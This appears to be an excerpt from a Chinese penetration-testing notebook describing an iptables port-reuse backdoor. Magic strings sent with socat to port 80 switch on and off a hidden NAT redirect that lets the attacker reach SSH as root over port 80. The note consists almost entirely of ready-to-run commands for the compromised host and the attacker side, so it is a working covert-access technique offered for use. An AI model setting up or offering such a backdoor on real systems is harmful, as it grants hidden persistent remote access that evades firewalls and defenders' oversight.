	>iptables -t nat -N LETMEIN 
	>iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
	# 开启开关
	>iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
	# 关闭开关
	>iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
	>iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
	攻击端：
	#开启复用
	>echo threathuntercoming | socat - tcp:192.168.0.110:80
	#ssh使用80端口进行登录
	ssh -p 80 root@192.168.0.110
	#关闭复用
	echo threathunterleaving | socat - tcp:192.168.0.110:80
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/580.png)